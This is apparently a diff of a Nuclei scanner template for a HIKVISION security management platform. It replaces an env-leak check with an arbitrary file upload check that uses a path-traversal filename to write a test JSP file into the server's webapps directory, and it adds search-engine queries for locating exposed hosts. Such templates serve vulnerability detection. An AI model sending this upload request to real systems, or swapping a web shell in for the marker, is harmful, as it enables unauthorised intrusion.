@@ -1,27 +1,35 @@
 id: HiKVISION
 
 info:
-  name: HiKVISION Integrated Security Management Platform Env Information Leakage Vulnerability
-  author: zerZero Trust Security Attack and Defense Laboratoryo
-  severity: medium
+  name: HiKVISION Comprehensive Security Management Platform Files Arbitrary File Upload Vulnerability
+  author: Zero Trust Security Attack and Defense Laboratory
+  severity: high
   description: |
-    There is an information leakage vulnerability in the HIKVISION comprehensive security management platform, which allows attackers to obtain sensitive information such as environmental env for further attacks
+    HiKVISION comprehensive security management platform files interface has an arbitrary file upload vulnerability, allowing attackers to upload arbitrary files through the vulnerability
   metadata:
-    fofa-query: app="HIKVISION-综合安防管理平台"
+    fofa-query: app="HIKVISION-综合安防管理平台" || title=="综合安防管理平台"
     hunter-query: web.icon="3670cbb1369332b296ce44a94b7dd685"
 
+
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/artemis-portal/artemis/env"
+  - raw:
+      - |
+          POST /center/api/files;.html HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
 
-    matchers-condition: and
+          ------WebKitFormBoundary9PggsiM755PLa54a
+          Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/test.jsp"
+          Content-Type: application/zip
+
+          <%out.print("test");%>
+
+          ------WebKitFormBoundary9PggsiM755PLa54a--
+
+    req-condition: true
     matchers:
-      - type: word
-        part: body
-        words:
-          - "profiles"
-
-      - type: status
-        status:
-          - 200
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "test.jsp")'
+        condition: and
